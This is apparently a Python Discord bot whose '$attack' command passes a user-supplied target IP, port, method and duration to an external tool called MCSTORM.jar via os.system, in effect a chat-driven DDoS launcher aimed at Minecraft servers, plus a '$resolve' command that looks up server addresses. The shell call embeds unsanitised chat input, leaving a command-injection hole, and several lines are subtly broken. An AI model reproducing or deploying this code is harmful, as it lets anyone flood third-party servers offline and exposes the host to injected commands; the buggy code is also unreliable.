# TODO:
# DDOS
# RESOLVE


import discord
import json
import os
import urllib.request
import threading

from discord.ext import commands

token = ""  # Токен вашего бота

bot = commands.Bot(command_prefix="$")

def attackthread(ip, port, duration, protocol, method):
    os.system("java -jar MCSTORM.jar {}:{} {} {} {} {}".format(ip, port, protocol, method, duration, "-1"))

@bot.event
async def on_ready():
    print("Bot ready {0.user}".format(bot))

# ----------- Attack
@bot.command()
async def attack(ctx, ip: str, port: int, protocol: int, duration: int, method: str):
    # create embed
    embed = discord.Embed(title="Sent attack...", description="Атака успешно отправлена! by {}".format(ctx.message.author.mention))
    embed.add_field(name="ip:", value=ip, inline=False)
    embed.add_field(name="port:", value=port, inline=False)
    embed.add_field(name="Version:", value=protocol, inline=False)
    embed.add_field(name="duration:", value=duration + " sec", inline=False)
    embed.add_field(name="Method:", value=method, inline=False)
    embed.add_field(name="Power", value="high", inline=False)
    await ctx.send(embed=embed)
    # start attack (Using threading)
    atck = threading.Thread(target=attackthread, args=[ip, port, duration, protocol, method,])
    atck.setDaemon(True)
    atck.start()
# ----------- Resolve
@bot.command()
async def resolve(ctx, ip: str):
    url = "https://api.mcsrvstat.us/2/" + ip
    file = urllib.request.urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)



    # online
    if json_object["Online"] == 'True':
        status = "✅ Server online"
    else:
        status = "ofline"

    # create embed
    embed = discord.Embed(title="successfully!", color=discord.Color.dark_purple)
    embed.add_field(name="IP:", value=json_object["ip"])
    embed.add_field(name="Port:", value=json_object["port"])
    embed.add_field(name="Hostname:", value=json_object["hostname"])
    embed.add_field(name="Status:", value=status, inline=False)
    await ctx.send(embed=embed)
bot.run(token)